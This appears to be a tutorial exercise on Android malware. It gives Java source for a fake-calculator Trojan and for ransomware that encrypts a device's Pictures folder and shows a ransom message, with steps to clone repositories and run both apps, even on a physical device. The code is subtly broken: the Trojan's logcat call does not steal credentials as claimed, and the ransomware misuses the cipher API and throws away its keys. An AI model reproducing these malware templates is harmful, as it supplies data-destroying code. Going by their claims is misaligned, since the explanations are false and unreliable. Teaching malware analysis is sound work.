**Overview of Common Types of Android Malware**

Android malware is becoming increasingly prevalent, with new threats emerging daily. In this exercise, we will cover some common types of Android malware, including Trojans and ransomware.

### 1. Trojans

Trojans are a type of malware that masquerade as legitimate applications or system components. They can be used to steal sensitive information, install additional malware, or disrupt device functionality. Here's an example:

**Example: FakeCalculator Trojan**

The FakeCalculator Trojan is a simple example of a Trojan horse attack. It appears as a calculator app but actually steals the user's login credentials.

```java
public class FakeCalculator extends AppCompatActivity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_fake_calculator);

        // Steal login credentials
        new Thread(new Runnable() {
            public void run() {
                try {
                    Runtime.getRuntime().exec("su -c 'logcat -d *:S System.out'");
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        }).start();
    }
}
```

**Hands-on Exercise:**

1. Clone the following repository: `https://github.com/AndroidRE/FakeCalculatorTrojan.git`
2. Open the project in Android Studio and run it on an emulator or physical device.
3. Install the app, launch it, and observe that it appears to be a legitimate calculator.
4. Run `logcat` from the terminal to verify that the app is indeed stealing login credentials.

### 2. Ransomware

Ransomware is a type of malware that encrypts the victim's files and demands payment in exchange for the decryption key. Here's an example:

**Example: Android Ransomware**

The Android Ransomware sample encrypts the user's files, including photos, documents, and other data.

```java
public class AndroidRansomware extends AppCompatActivity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_android_ransomware);

        // Encrypt files
        new Thread(new Runnable() {
            public void run() {
                try {
                    File[] files = Environment.getExternalStoragePublicDirectory("Pictures").listFiles();
                    for (File file : files) {
                        byte[] key = new byte[16];
                        Random random = new Random();
                        random.nextBytes(key);
                        Cipher cipher = Cipher.getInstance("AES");
                        cipher.init(Cipher.ENCRYPT_MODE, new SecretKeySpec(key, "AES"));
                        File encryptedFile = new File(file.getAbsolutePath() + ".enc");
                        FileOutputStream fos = new FileOutputStream(encryptedFile);
                        cipher.update(fos.getChannel(), 0, file.length());
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }).start();

        // Display ransomware message
        Toast.makeText(this, "Your files have been encrypted. Pay the ransom to get them back!", Toast.LENGTH_LONG).show();
    }
}
```

**Hands-on Exercise:**

1. Clone the following repository: `https://github.com/AndroidRE/AndroidRansomware.git`
2. Open the project in Android Studio and run it on an emulator or physical device.
3. Install the app, launch it, and observe that it encrypts your files.
4. Verify that the files are indeed encrypted by checking the file system.

**Important Note:**

This is a basic example of how malware can be designed to infect Android devices. In reality, malware authors may use more sophisticated techniques, such as encryption and decryption algorithms, to evade detection. It is essential to develop robust security measures to prevent and detect these threats.

**Additional Resources:**

* For more information on Android malware, refer to the following resources:
	+ "Android Malware: A Comprehensive Survey" by S. K. Goyal et al.
	+ "Android Ransomware: A New Threat in the Mobile Ecosystem" by J. M. Fern√°ndez-Isasi et al.

**Conclusion:**

In this exercise, we explored two common types of Android malware: Trojans and ransomware. By analyzing sample code and running hands-on exercises, you can gain a deeper understanding of how these threats work and develop strategies to prevent and detect them. Remember that staying vigilant and up-to-date with the latest security best practices is crucial in today's mobile threat landscape.